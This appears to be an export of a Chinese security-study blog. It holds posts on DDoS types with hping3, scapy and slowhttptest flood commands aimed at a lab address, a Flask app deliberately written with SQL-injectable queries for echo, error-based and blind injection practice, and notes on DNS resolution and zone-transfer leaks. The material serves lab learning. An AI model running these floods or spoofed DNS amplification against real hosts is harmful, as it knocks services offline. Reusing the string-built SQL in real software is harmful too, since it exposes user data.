    <content type="text"><![CDATA[DDOS分类？资源消耗类型连接类主要表现为常用的连接耗尽，包括并发连接，新建连接，慢速连接，空连接等； 数据库查询主要表现为账号验证，表项查询，数据提交等； 网络：带宽 防火墙：吞吐量，并发连接 服务器：CPU.内存，I/O 应用：处理请求能力，对操作系统的使用权 带宽上限，设备性能上限，协议性能上限，应用性能上限，系统性能上限 利用漏洞崩溃系统 崩溃程序 网络流量型：利用网络通讯协议 SYN Flood ACK Flood ICMP Flood UDP Flood DNS Flood HTTP Flood 应用层 Http Flood DNS Flood Https Flood等 协议层 SYN Flood、ICMP Flood Tcp Flood、Udp Flood等 网络层 Arp攻击 hping详细参数解析： -h –help 显示帮助信息 -v –version 显示Hping的版本信息 -c –count 指定数据包的次数 -i –interval 指定发包间隔为多少毫秒，如-i m10：表示发包间隔为毫秒 –flood 尽最快发送数据包，不显示回复 指定所用的模式： 默认模式 TCP模式 -0 –rawip RAW IP 模式 -1 –icmp ICMP 模式 -2 –udp UDP 模式 -8 –scan 扫描模式. 例: hping –scan 1-30,70-90 -S www.target.host -9 –listen 监听模式 IP选项： -a –spoof 源地址欺骗 –rand-dest 随机目的地址模式 –rand-source 随机源地址模式 -t –ttl ttl值，默认为64 -N –id 指定id，默认是随机的 -W –winid 使用win*的id 字节顺序 -r –rel 相对的id区域 -f –frag 将数据包分片后传输（可以通过薄弱的acl（访问控制 列表）） -x –morefrag 设置更多的分片标记 -y –dontfrag 设置不加分片标记 -g –fragoff 设置分片偏移 -m –mtu 设置虚拟MTU, 当数据包&gt;MTU时要使用–frag 进行分片 -o –tos 指定服务类型，默认是0x00,，可以使用–tos help查看帮助 -G –rroute 包含RECORD_ROUTE选项并且显示路由缓存 –lsrr 释放源路记录 –ssrr 严格的源路由记录 -H –ipproto 设置协议范围，仅在RAW IP模式下使用 ICMP选项 -C –icmptype 指定icmp类型（默认类型为回显请求） -K –icmpcode 指定icmp编码（默认为0） –force-icmp 发送所有ICMP数据包类型（默认只发送可以支持的类型） –icmp-gw 针对ICMP数据包重定向设定网关地址（默认是0.0.0.0） –icmp-ts 相当于–icmp –icmptype 13（ICMP时间戳） –icmp-addr 相当于–icmp –icmptype 17（ICMP地址掩码） –icmp-help 显示ICMP的其它帮助选项 UDP/TCP选项 -s –baseport 基本源端口（默认是随机的） -p –destport 目的端口（默认为0），可同时指定多个端口 -k –keep 仍然保持源端口 -w –win 指定数据包大小，默认为64 -O –tcpoff 设置假的TCP数据偏移 -Q –seqnum 仅显示TCP序列号 -b –badcksum 尝试发送不正确IP校验和的数据包 许多系统在发送数据包时使用固定的IP校验和，因此你会得到不正确的UDP/TCP校验和. -M –setseq 设置TCP序列号 -L –setack 使用TCP的ACK（访问控制列表） -F –fin 使用FIN标记set FIN flag -S –syn 使用SNY标记 -R –rst 使用RST标记 -P –push 使用PUSH标记 -A –ack 使用 ACK 标记 -U –urg 使用URG标记 -X –xmas 使用 X 未用标记 (0x40) -Y –ymas 使用 Y 未用标记 (0x80) –tcpexitcode 最后使用 tcp-&gt;th_flags 作为退出代码 –tcp-timestamp 启动TCP时间戳选项来猜测运行时间 常规选项 -d –data 数据大小，默认为0 -E –file 从指定文件中读取数据 -e –sign 增加签名 -j –dump 以十六进行形式转存数据包 -J –print 转存可输出的字符 -B –safe 启用安全协议 -u –end 当通过- -file指定的文件结束时停止并显示，防止文件再从头开始 -T –traceroute 路由跟踪模式 –tr-stop 在路由跟踪模式下当收到第一个非ICMP数据包时退出 –tr-keep-ttl 保持源TTL，对监测一个hop有用 –tr-no-rtt 使用路由跟踪模式时不计算或显示RTT信息 ARS 数据包描述（新增加的内容，暂时还不稳定） –apd-send 发送用描述APD的数据包 TCP的正常连接建立和关闭 TCP报文段格式 TCP三次握手三次握手(Three-way Handshake)，是指建立一个TCP连接时，需要客户端和服务器总共发送3个包。 三次握手的目的是连接服务器指定端口，建立TCP连接,并同步连接双方的序列号和确认号并交换 TCP 窗口大小信息.在socket编程中，客户端执行connect()时。将触发三次握手。 第一次握手: 客户端发送一个TCP的SYN标志位置1的包指明客户打算连接的服务器的端口，以及初始序号X,保存在包头的序列号(Sequence Number)字段里 第二次握手: 服务器发回确认包(ACK)应答。即SYN标志位和ACK标志位均为1同时，将确认序号(Acknowledgement Number)设置为客户的ISN(初始序列号)加1以.即X+1。 第三次握手.客户端再次发送确认包(ACK) SYN标志位为0,ACK标志位为1.并且把服务器发来ACK的序号字段+1,放在确定字段中发送给对方.并且在数据段放写ISN的+1 TCP四次挥手 DDoS测试SYN Flood原理：攻击者通过发送大量伪造的带有SYN标志位的TCP报文，与目标主机建立了很多虚假的半开连接，在服务器返回SYN+ACK数据包后，攻击者不对其做出响应，也就是不返回ACK数据包给服务器，这样服务器就会一直等待直到超时。 在三次握手过程中，服务器发送SYN-ACK之后，收到客户端的ACK之前的TCP连接称为半连接(half-open connect).此时服务器处于Syn_RECV状态.当收到ACK后，服务器转入ESTABLISHED状态. 现象：使目标服务器连接资源耗尽、链路堵塞，从而达到拒绝服务的目的。 由于源地址是不存在的，服务器需要不断的重发直至超时，这些伪造的SYN包将长时间占用未连接队列，正常的SYN请求被丢弃，目标系统运行缓慢，严重者引起网络堵塞甚至系统瘫痪。 测试命令：hping3 -c 1000 -d 120 -S -p 80 –flood –rand-source 192.168.1.116 -c –count 指定数据包的次数 -d –data 数据大小，默认为0 -S –syn 使用SNY标记 -p –destport 目的端口（默认为0），可同时指定多个端口 统计分析： windows：netstat –an | find “SYN_RECEIVED” linux：netstat -n | awk ‘/^tcp/ {++S[$NF]} END {for(a in S) print a, S[a]}’ Win7如何开启/关闭TCP/IP半开连接数限制 ACK Flood原理：第一种：攻击者伪造大量的SYN+ACK包发送给目标主机，目标主机每收到一个SYN+ACK数据包时，都会去自己的TCP连接表中查看有没有与ACK的发送者建立连接，如果有则发送ACK包完成TCP连接，如果没有则发送ACK+RST 断开连接。但是在查询过程中会消耗一定的CUP计算资源。 第二种： 利用TCP三次握手的ACK+SYN应答，攻击者向不同的服务器发送大量的SYN请求，这些SYN请求数据包的源IP均为受害主机IP 现象：针对第一种方式：如果瞬间收到大量的SYN+ACK数据包，将会消耗服务器的大量cpu资源，导致正常的连接无法建立或增加延迟，甚至造成服务器瘫痪、死机。 针对第二种方式：会有大量的SYN+ACK应答数据包发往受害主机，从而占用目标的网络带宽资源，形成拒绝服务。 测试命令：hping3 –ack -S –flood 192.168.1.116 -s 6666 固定源端口 默认是随机的 ICMP Flood原理：ICMP Flood 的攻击原理和ACK Flood原理类似，属于流量型的攻击方式，由于目前很多防火墙直接过滤ICMP报文， 因此ICMP Flood出现的频度较低。 现象：给服务器带来较大的负载，影响服务器的正常。 测试命令：hping3 -d 200 –icmp –flood -a 1.1.1.1 192.168.1.116 -d –data 数据大小，默认为0 -a 指定源IP UDP Flood原理：UDP（User Datagram Protocol，用户数据报协议），是一种无连接和无状态的网络协议，UDP不需要像TCP那样进行三次握手，运行开销低，不需要确认数据包是否成功到达目的地。这就造成UDP泛洪攻击不但效率高，而且还可以在资源相对较少的情况下执行。UDP大量小数据包会增大网络设备处理数据包的压力；FLOOD可以使用小数据包(64字节)进行攻击,也可以使用大数据包(大于1500字节,以太网MTU为1500字节)进行攻击。 现象：对于大数据包，网络设备需要进行分片、重组，最终达到的效果就是占用网络传输接口的带宽、网络堵塞、服务器响应慢等等。 测试命令：hping3 –udp -p 53 –flood 192.168.1.116 DNS Flood 反射攻击原理： 利用协议特性实现放大效果的流量，查询流量小，相应流量非常巨大 攻击者向僵尸网络发出指令，使僵尸网络中的每一台主机均发出一个伪造源地址的DNS查询请求包，这些请求包查询类型设置为ANY，因为这种类型会请求所有的记录，这些记录会在返回的响应包中，也就是说这种数据包的大小较其他类型是最大的。 伪造DNS数据包，向DNS服务器发送域名查询报文了，而DNS服务器返回的应答报文则会发送给被攻击主机。放大体现在请求DNS回复的类型为ANY，攻击者向服务器请求的包长度为69个字节，而服务器向被攻击主机回复的ANY类型DNS包长度为535字节，大约放大了7倍。 DNS 报文格式 测试命令：scapy i = IP (src=”192.168.1.107”,dst=”114.114.114.114”) u = UDP() q = DNSQR(qname=”nsfocus.com”,qtype=255) d =DNS (rd =1, qdcount=1,qd=q) r = (i/u/d) send(r,loop=1) q = DNSQR(qname=”nsfocus.com”,qtype=255) # 255 类型是any d =DNS (rd =1, qdcount=1,qd=q) #rd=1表示执行递归查询 如果迭代查询第一个请求的DNS服务器没有查询到结果，那么第一个请求的服务器会返回另一个DNS服务器IP，让请求主机向这个IP去继续查询，然而攻击者的数据包源地址是伪造的，所以并不会发起第二次查询，因为第一次查询根本就不是它发起的；而递归查询却是在查询到结果之后，才返回给查询请求发起者。 r = (i/u/d) #合并数据包 CC攻击原理：又称作HTTP 泛洪攻击，其原理是攻击者控制肉鸡、僵尸网络或使用代理服务器，不停地向目标的web服务发送大量合法请求 现象：使得正常用户的web请求处理缓慢甚至得不到处理，制造大量的后台数据库查询动作，消耗目标CPU资源，最终导致服务器宕机崩溃。 测试命令： HTTP慢速攻击原理：模拟正常用户向web服务器发送慢速http请求，由于是慢速的，服务器端需要保持连接资源，直到数据传输结束或请求结束才可释放连接。这种攻击可以分为两类：一类是客户端发数据，另一类是客户端读取服务器发来的数据。HTTP慢速攻击对基于线程处理的web服务器影响显著，如apache、dhttpd，而对基于事件处理的web服务器影响不大，如ngix、lighttpd。 现象：当服务器端建立了大量这样的慢速连接，就会导致服务器拒绝服务。 Slowloris攻击方式HTTP协议规定请求头以一个空行结束，所以完整的http请求头结尾是\r\n\r\n。然而使用非正常的\r\n来结尾，就会导致服务端认为我们的请求头还没结束，等待我们继续发送数据直到超时时间。两种请求头区别如下，CRLF（CarriageReturn Line Feed）表示回车换行 Slow post攻击方式在http头部信息，可以使用content-length声明HTTP消息实体的传输长度，服务器端会content-length的值作为HTTPBODY的长度。利用这一特点，攻击者把content-length设置得很大的，然后缓慢发送数据部分，比如一次只发送一个字节，这样服务器端就要一直保持连接，直到客户端传完所有的数据。 Slow read攻击方式攻击者发送一个完整的HTTP数据请求，之后服务器会给出响应，这时攻击者在将自己的TCP窗口大小设置的很小，服务器会根据客户的TCP窗口大小来传送数据。由于客户端的TCP窗口大小很小，服务器只能缓慢的传输数据给客户端。当建立大量的这种连接时，web应用的并发连接池将被耗尽，最终导致拒绝服务。 Apache range header攻击这种攻击方式只针对apache，当客户端传输大文件时会有range字段，表示将大文件分段，分成几个小段进行传输。例如攻击者将一个文件按照一个字节一段，分成好多段，这样就会造成传输数据缓慢，长时间占用连接，消耗服务器CPU和内存资源。 测试命令：安装slowhttptest Slowloris攻击命令：slowhttptest -c 50 -H -g -o my_header_stats -i 10 -r 200 -t GET -u slowhttptest -c 50 -H -g -o my_header_stats -i 10 -r 200 -t GET -u http://192.168.1.116/dvwa/login.php -c number of connections 测试时建立的连接数-H SlowLoris模式-g 在测试完成后，以时间戳为名生成一个CVS和HTML文件的统计数据-o file name 使用-g参数时，可以使用此参数指定输出文件名-i seconds 在slowrois和Slow POST模式中，指定发送数据间的间隔。-r connections per second 每秒连接个数-t HTTP verb 在请求时使用什么操作，默认GET netstat -pantu | grep ESTABLISHED 正常 异常，0d表示\r,0a表示\n，也就是说结尾是\r\n。 Slow post攻击命令slowhttptest -c 3000 -B -g -o my_body_stats -i 110 -r 200 -s 8888 -t FAKEVERB -u http://192.168.1.116/dvwa/login.php -x 10 -p 3 -s 设置的数据长度 Slow read攻击命令slowhttptest -c 8000 -X -r 200 -w 512 -y 1024 -n 5 -z 32 -k 3 -u http://192.168.1.116/dvwa/login.php -x 24 -p 3 Apache range header攻击命令slowhttptest -R -u http://192.168.1.116/dvwa/login.php -t HEAD -c 1000 -a 10 -b 3000 -r 500 参考资料：https://www.cnblogs.com/zmlctt/p/3690998.html https://xz.aliyun.com/t/71#toc-11 https://blog.csdn.net/Fly_hps/article/details/80941148]]></content>
  </entry>
  <entry>
    <title><![CDATA[各种注入类型的环境搭建和代码编写]]></title>
    <url>%2F2019%2F10%2F03%2F%E5%90%84%E7%A7%8D%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%E7%9A%84%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%92%8C%E4%BB%A3%E7%A0%81%E7%BC%96%E5%86%99%2F</url>
    <content type="text"><![CDATA[目标：通过flask实现用户注册 用户登录 用户查询目录结构python_web —templates # 模板 —registe.html —login.html —base.html —result.html —main.py 需要用到的第三方库 pymysqflaskrender_templaterequestBootstrap 思路1、导入第三方库 启动一个简单的flask应用2、定义路由 ‘/regist’ 注册页面，’/‘登录页面，’/serch’搜索页面3、pymysql 连接数据库 main.py12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667from flask import request,Flask,render_templateimport pymysqlfrom flask_bootstrap import Bootstrapapp = Flask(__name__)bootstrap = Bootstrap(app)@app.route(&apos;/regist&apos;)def regist(): return render_template(&apos;regist.html&apos;)@app.route(&apos;/&apos;)def login(): return render_template(&apos;login.html&apos;)@app.route(&apos;/registuser&apos;)def registuser(): db = pymysql.connect(&apos;localhost&apos;,&apos;root&apos;,&apos;nsfocus123&apos;,&apos;users&apos;) cursor = db.cursor() username = request.args.get(&apos;user&apos;) userpass = request.args.get(&apos;password&apos;) sql= &quot;INSERT INTO USER(user,password) VALUE (&apos;%s&apos;,&apos;%s&apos;)&quot; % (username,userpass) try: cursor.execute(sql) db.commit() return render_template(&apos;login.html&apos;) except: db.rollback() return &apos;对不起，您的注册失败 &apos; db.close()@app.route(&apos;/login&apos;)def checkuser(): db=pymysql.connect(&apos;localhost&apos;,&apos;root&apos;,&apos;nsfocus123&apos;,&apos;users&apos;) cursor=db.cursor() username = request.args.get(&apos;user&apos;) userpass = request.args.get(&apos;password&apos;) sql= &quot;SELECT * FROM USER WHERE user=&apos;%s&apos; AND password = %s&quot; % (username,userpass) cursor.execute(sql) db.commit() result=cursor.fetchall() if (result!=()): return &apos;登录成功&apos; return &apos;登录失败&apos;# @app.route(&apos;/getuser&apos;)# def getuer():# return render_template(&apos;getuer.html&apos;)@app.route(&apos;/search&apos;,methods=[&quot;get&quot;,&quot;post&quot;])def search(): db=pymysql.connect(&apos;localhost&apos;,&apos;root&apos;,&apos;nsfocus123&apos;,&apos;users&apos;) cursor=db.cursor() username = request.args.get(&apos;user&apos;) sql= &quot;SELECT * FROM USER WHERE user = &apos;%s&apos;&quot; % username try: cursor.execute(sql) except Exception as err: return (&quot;Error %s for excute sql: %s &quot; % (err, &quot;SELECT * FROM USER WHERE USER = &apos;%s&apos;&quot; % pymysql.escape_string(username))) db.commit() result=cursor.fetchall() db.commit() db.close() return render_template(&apos;result.html&apos;,u=result)if __name__ == &apos;__main__&apos;: app.run(host=&apos;0.0.0.0&apos;,port=&apos;8898&apos;) 问题Q: 如何使用变量向sql语句中传递参数 A： username= zsc userpass = 0810 sql= “INSERT INTO USER(user,password) VALUE (‘%s’,’%s’)” % (username,userpass) 使用该方法可以向数据库中插入字符串，否则只允许插入整形 result = cursor.fetchone() # 返回单个的元组，也就是一条记录(row)，如果没有结果 则返回 Noneresult = cursor.fetchall() # 返回多个元组，即返回多个记录(rows),如果没有结果 则返回 () base.html1234567891011121314151617181920&#123;% extends &quot;bootstrap/base.html&quot; %&#125;&#123;% block title %&#125;Flask&#123;% endblock %&#125;&#123;% block navbar %&#125;&lt;div class=&quot;navbar navbar-inverse&quot; role=&quot;navigation&quot;&gt; &lt;div class=&quot;container&quot;&gt; &lt;div class=&quot;navbar-header&quot;&gt; &lt;button type=&quot;button&quot; class=&quot;navbar-toggle&quot; data-toggle=&quot;collapse&quot; data-target=&quot;.navbar-collapse&quot;&gt; &lt;span class=&quot;sr-only&quot;&gt;Toggle navigation&lt;/span&gt; &lt;span class=&quot;icon-bar&quot;&gt;&lt;/span&gt; &lt;span class=&quot;icon-bar&quot;&gt;&lt;/span&gt; &lt;span class=&quot;icon-bar&quot;&gt;&lt;/span&gt; &lt;/button&gt; &lt;a class=&quot;navbar-brand&quot; href=&quot;/&quot;&gt;注册用户查询系统&lt;/a&gt; &lt;/div&gt; &lt;div class=&quot;navbar-collapse collapse&quot;&gt; &lt;ul class=&quot;nav navbar-nav&quot;&gt; &lt;li&gt;&lt;a href=&quot;/&quot;&gt;首页&lt;/a&gt;&lt;/li&gt;​ &lt;/ul&gt; &lt;/div&gt; ​12345678910111213141516171819202122232425&lt;/div&gt;&lt;body&gt; &lt;form method=&quot;get&quot; action=&apos;/search&apos;&gt; &lt;label&gt;请输入您要搜索的用户名：&lt;br&gt;&lt;input type=&quot;text&quot; name=&quot;user&quot; value=&quot;&quot;&gt;&lt;/label&gt; &lt;input type=&quot;submit&quot; value=&quot;搜索&quot;&gt; &lt;/form&gt; &lt;/body&gt;&#123;% endblock %&#125;&#123;% block content %&#125;&lt;div class=&quot;container&quot;&gt; &#123;% block page_content %&#125;&#123;% endblock %&#125;&lt;/div&gt;&#123;% endblock %&#125;&lt;body&gt; &lt;form method=&quot;get&quot; action=&apos;/getuser&apos;&gt; &lt;label&gt;请输入您要搜索的用户名：&lt;input type=&quot;text&quot; name=&quot;user&quot; value=&quot;&quot;&gt;&lt;/label&gt; &lt;input type=&quot;submit&quot; value=&quot;搜索&quot;&gt; &lt;/form&gt;​ &lt;/body&gt; regist.html123456789101112131415&lt;html lang=&quot;en&quot;&gt; &lt;head&gt; &lt;title&gt;&lt;/title&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt; &lt;link href=&quot;css/style.css&quot; rel=&quot;stylesheet&quot;&gt; &lt;/head&gt; &lt;body&gt; &lt;form method=&quot;get&quot; action=&apos;/registuser&apos;&gt; &lt;label&gt;用户名：&lt;input type=&quot;text&quot; name=&quot;user&quot; value=&quot;&quot;&gt;&lt;/label&gt; &lt;label&gt;密码：&lt;input type=&quot;password&quot; name=&quot;password&quot; value=&quot;&quot;&gt;&lt;/label&gt; &lt;input type=&quot;submit&quot; value=&quot;注册&quot;&gt; &lt;/form&gt; &lt;/body&gt;&lt;/html&gt; login.html123456789101112131415&lt;html lang=&quot;en&quot;&gt; &lt;head&gt; &lt;title&gt;&lt;/title&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt; &lt;link href=&quot;css/style.css&quot; rel=&quot;stylesheet&quot;&gt; &lt;/head&gt; &lt;body&gt; &lt;form method=&quot;get&quot; action=&apos;/login&apos;&gt; &lt;label&gt;用户名：&lt;input type=&quot;text&quot; name=&quot;user&quot; &gt;&lt;/label&gt;&lt;br&gt; &lt;label&gt;密码：&lt;input type=&quot;password&quot; name=&quot;password&quot; &gt;&lt;/label&gt;&lt;br&gt; &lt;input type=&quot;submit&quot; value=&quot;登录&quot;&gt; &lt;/form&gt; &lt;/body&gt;&lt;/html&gt; result.html12345678910111213141516171819&lt;html lang=&quot;en&quot;&gt; &lt;head&gt; &lt;title&gt;&lt;/title&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt; &lt;link href=&quot;css/style.css&quot; rel=&quot;stylesheet&quot;&gt; &lt;/head&gt;​ &lt;body&gt; &lt;form method=&quot;get&quot; action=&apos;/login&apos;&gt; &lt;label&gt;用户名：&lt;input type=&quot;text&quot; name=&quot;user&quot; &gt;&lt;/label&gt;&lt;br&gt; &lt;label&gt;密码：&lt;input type=&quot;password&quot; name=&quot;password&quot; &gt;&lt;/label&gt;&lt;br&gt; &lt;input type=&quot;submit&quot; value=&quot;登录&quot;&gt; &lt;/form&gt;​ &lt;/body&gt;&lt;/html&gt; blind_result.html12345678910111213141516&#123;% extends &quot;base.html&quot; %&#125;&#123;% block title %&#125;首页&#123;% endblock %&#125;&#123;% block page_content %&#125; &lt;table class=&quot;table table-bordered&quot;&gt; &lt;tr&gt; &lt;th&gt;用户ID&lt;/th&gt;&lt;/tr&gt; &#123;% for i in u %&#125; &lt;tr&gt; &lt;td&gt;&#123;&#123; 正在查询中 &#125;&#125;&lt;/td&gt; &lt;/tr&gt;&#123;% endfor %&#125;&lt;/table&gt;&#123;% endblock %&#125; 目标：sql注入环境代码1、常规回显注入的代码前端提交数据，后端接受，sql语句直接执行 123456789101112@app.route(&apos;/search&apos;,methods=[&quot;get&quot;,&quot;post&quot;])def search(): db=pymysql.connect(&apos;localhost&apos;,&apos;root&apos;,&apos;nsfocus123&apos;,&apos;users&apos;) cursor=db.cursor() username = request.args.get(&apos;user&apos;) sql= &quot;SELECT * FROM USER WHERE user = &apos;%s&apos;&quot; % username cursor.execute(sql) db.commit() result=cursor.fetchall() db.commit() db.close() return render_template(&apos;result.html&apos;,u=result) 2、报错注入的代码打印数据库报错信息到前端即可 12345678910111213141516@app.route(&apos;/search&apos;,methods=[&quot;get&quot;,&quot;post&quot;])def search(): db=pymysql.connect(&apos;localhost&apos;,&apos;root&apos;,&apos;nsfocus123&apos;,&apos;users&apos;) cursor=db.cursor() username = request.args.get(&apos;user&apos;) sql= &quot;SELECT * FROM USER WHERE user = &apos;%s&apos;&quot; % username try: cursor.execute(sql) except Exception as err: return (&quot;Error %s for excute sql: %s &quot; % (err, &quot;SELECT * FROM USER WHERE USER = &apos;%s&apos;&quot; % pymysql.escape_string(username))) db.commit() result=cursor.fetchall() db.commit() db.close() return render_template(&apos;result.html&apos;,u=result) 3、盲注的代码盲注即不会回显数据到前端 123456789101112@app.route(&apos;/search&apos;,methods=[&quot;get&quot;,&quot;post&quot;])def search(): db=pymysql.connect(&apos;localhost&apos;,&apos;root&apos;,&apos;nsfocus123&apos;,&apos;users&apos;) cursor=db.cursor() username = request.args.get(&apos;user&apos;) sql= &quot;SELECT * FROM USER WHERE user = &apos;%s&apos;&quot; % username try: cursor.execute(sql) except Exception as err: return (&quot;Error %s for excute sql: %s &quot; % (err, &quot;SELECT * FROM USER WHERE USER = &apos;%s&apos;&quot; % pymysql.escape_string(username)))​ db.commit() result=cursor.fetchall() db.commit() db.close() return render_template(‘result.html’,u=result) if (result!=()): # 盲注 不显示查询到的结果返回前端 return ‘正在查询中’ return “404”,404​12 4、编写宽子节注入的代码，有问题~HTTP头部详解User-Agent：使得服务器能够识别客户使用的操作系统，游览器版本等.（很多数据量大的网站中会记录客户使用的操作系统或浏览器版本等存入数据库中） Cookie：网站为了辨别用户身份、进行 session 跟踪而储存在用户本地终端上的数据（通常经过加密）. X-Forwarded-For：简称XFF头，它代表客户端，也就是HTTP的请求端真实的IP,（通常一些网站的防注入功能会记录请求端真实IP地址并写入数据库or某文件[通过修改XXF头可以实现伪造IP]）. Clien-IP：同上，不做过多介绍. Rerferer：浏览器向 WEB 服务器表明自己是从哪个页面链接过来的. 参考资料http://www.voidcn.com/article/p-mzbkjrov-uo.html https://zhidao.baidu.com/question/751764377992914884.html https://lyiang.wordpress.com/2015/06/09/sql%E6%B3%A8%E5%85%A5%EF%BC%9A%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%EF%BC%88gbk%E5%8F%8C%E5%AD%97%E8%8A%82%E7%BB%95%E8%BF%87%EF%BC%89/ https://_thorns.gitbooks.io/sec/content/httpqing_qiu_tou_xin_xi_de_zhu_ru.html https://zhuanlan.zhihu.com/p/27553821]]></content>
  </entry>
  <entry>
    <title><![CDATA[WEB页面解析流程]]></title>
    <url>%2F2019%2F09%2F19%2FWEB%E9%A1%B5%E9%9D%A2%E8%A7%A3%E6%9E%90%E6%B5%81%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[[TOC] 1、理解域名解析的整个过程DNS是什么？DNS( Domain Name System)是“域名系统”的英文缩写,用于TCP/IP网络，它所提供的服务是用来将主机名和域名转换为IP地址的工作。 网络通讯大部分是基于TCP/IP的，而TCP/IP是基于IP地址的，所以计算机在网络上进行通讯时只能识别如“202.96.134.133”之类的IP地址，而不能认识域名。我们无法记住10个以上IP地址的网站，所以我们访问网站时，更多的是在浏览器地址栏中输入域名，就能看到所需要的页面，这是因为有一个叫“DNS服务器”的计算机自动把我们的域名“翻译”成了相应的IP地址，然后调出IP地址所对应的网页。 工作流程： 1、在浏览器中输入www . qq .com 域名，操作系统会先检查自己本地的hosts文件是否有这个网址映射关系，如果有，就先调用这个IP地址映射，完成域名解析。 2、如果hosts里没有这个域名的映射，则查找本地DNS解析器缓存，是否有这个网址映射关系，如果有，直接返回，完成域名解析。 3、如果hosts与本地DNS解析器缓存都没有相应的网址映射关系，首先会找TCP/ip参数中设置的首选DNS服务器，在此我们叫它本地DNS服务器，此服务器收到查询时，如果要查询的域名，包含在本地配置区域资源中，则返回解析结果给客户机，完成域名解析，此解析具有权威性。 4、如果要查询的域名，不由本地DNS服务器区域解析，但该服务器已缓存了此网址映射关系，则调用这个IP地址映射，完成域名解析，此解析不具有权威性。 5、如果本地DNS服务器本地区域文件与缓存解析都失效，则根据本地DNS服务器的设置（是否设置转发器）进行查询， （1）如果未用转发模式，本地DNS就把请求发至13台根DNS，根DNS服务器收到请求后会判断这个域名(.com)是谁来授权管理，并会返回一个负责该顶级域名服务器的一个IP。本地DNS服务器收到IP信息后，将会联系负责.com域的这台服务器。这台负责.com域的服务器收到请求后，如果自己无法解析，它就会找一个管理.com域的下一级DNS服务器地址(http://qq.com)给本地DNS服务器。当本地DNS服务器收到这个地址后，就会找http://qq.com域服务器，重复上面的动作，进行查询，直至找到www . qq .com主机。 （2）如果用的是转发模式，此DNS服务器就会把请求转发至上一级DNS服务器，由上一级服务器进行解析，上一级服务器如果不能解析，或找根DNS或把转请求转至上上级，以此循环。不管是本地DNS服务器用是是转发，还是根提示，最后都是把结果返回给本地DNS服务器，由此DNS服务器再返回给客户机。 ​ 从客户端到本地DNS服务器是属于递归查询，而DNS服务器之间就是的交互查询就是迭代查询。 DNS 域名称的五个类别 一些常见的DNS域名称 DNS记录 A记录 IP地址记录,记录一个域名对应的IP地址AAAA记录 IPv6 地址记录，记录一个域名对应的IPv6地址CNAME记录 别名记录，记录一个主机的别名MX记录 电子邮件交换记录，记录一个邮件域名对应的IP地址NS记录 域名服务器记录 ,记录该域名由哪台域名服务器解析PTR记录 反向记录，也即从IP地址到域名的一条记录TXT记录 记录域名的相关文本信息 第一行Server是： DNS服务器的主机名 –114.114.114.114 第二行Address是： 服务器的ip地址 –114.114.114.114#53 非权威应答（Non-authoritative answer）： Name是：解析的URL –www.zsc0810.site Address是：47.105.32.145 DNS域传送漏洞：什么是DNS域传送？ DNS 服务器分为： 主服务器、备份服务器和缓存服务器。域传送是指后备服务器从主服务器拷贝数据，并用得到的数据更新自身数据库。 在主备服务器之间同步数据库，需要使用 “DNS 域传送 ” 。 危险：若DNS服务器配置不当，可能导致匿名用户获取某个域的所有记录。造成整个网络的拓扑结构泄露给潜在的攻击者，包括一些安全性较低的内部主机，如测试服务器。凭借这份网络蓝图，攻击者可以节省很少的扫描时间。 （1）一键安装Dockercurl -s https://get.docker.com/ | sh 如果是使用一键安装工具安装的docker，则docker会自动启动。 （2）安装Docker Composecurl -L https://github.com/docker/compose/releases/download/1.7.0/docker-compose-`uname -s -uname -m` &gt; /usr/local/bin/docker-compose chmod +x /usr/local/bin/docker-compose docker-compose -v （3）下载Vulhub（4）启动环境进入相应路径 cd /path/to/vuln/ 运行 docker-compose up -d 结束 docker-compose down 启动192.168.1.100带有DNS域传送漏洞的DNS服务器 使用nmap扫描DNS域传送泄露漏洞 2 用dig来测试DNS服务器是否存在域传送泄露 3 DNS查询工具nslookup对DNS域传送的测试（在交互式shell中发现一个DNS服务器的域传送漏洞的过程） 操作基本的步骤是: 1) 输入nslookup命令进入交互式shell 2) Server 命令参数设定查询将要使用的DNS服务器 3) Ls命令列出某个域中的所有域名 4) Exit命令退出程序 攻击者能获取的敏感主要包括： 1）网络的拓扑结构，服务器集中的IP地址段 2）数据库服务器的IP地址，例如上述nwpudb2.nwpu.edu.cn 3）测试服务器的IP地址，例如test.nwpu.edu.cn 4）VPN服务器地址泄露 5）其他敏感服务器 2、WEB 页面请求的整个流程（从输入URL到页面加载发生了什么？）总的来说分为以下几个过程： DNS解析 TCP连接 发送HTTP请求 服务器处理请求并返回HTTP报文 浏览器解析渲染页面 连接结束具体过程 具体过程:DNS解析实现了网址到IP地址的转换。网址到IP地址转换的过程是如何进行的? 首先在本地域名服务器中查询IP地址，如果没有找到的情况下，本地域名服务器会向根域名服务器发送一个请求，如果根域名服务器也不存在该域名时，本地域名会向com顶级域名服务器发送一个请求，依次类推下去。直到最后本地域名服务器得到google的IP地址并把它缓存到本地，供下次查询使用。 所有网址真正的解析过程为: . -&gt; .com -&gt; google.com. -&gt; www.google.com.。 DNS优化如何减少该过程的步骤呢？那就是DNS缓存。 DNS存在着多级缓存，从离浏览器的距离排序的话，有以下几种: 浏览器缓存，系统缓存，路由器缓存，IPS服务器缓存，根域名服务器缓存，顶级域名服务器缓存，主域名服务器缓存。 在你的chrome浏览器中输入:chrome://dns/，你可以看到chrome浏览器的DNS缓存。 系统缓存主要存在/etc/hosts(Linux系统)中: 谷歌浏览器缓存 DNS负载均衡DNS可以返回一个合适的机器的IP给用户，例如可以根据每台机器的负载量，该机器离用户地理位置的距离等等，这种过程就是DNS负载均衡，又叫做DNS重定向。CDN(Content Delivery Network)就是利用DNS的重定向技术，DNS服务器会返回一个跟用户最接近的点的IP地址给用户，CDN节点的服务器负责响应用户的请求，提供所需的内容 TCP连接HTTP协议是使用TCP作为其传输层协议的 HTTPS协议的本质就是HTTP + SSL(or TLS)。在HTTP报文进入TCP报文之前，先使用SSL对HTTP报文进行加密。从网络的层级结构看它位于HTTP协议与TCP协议之间。 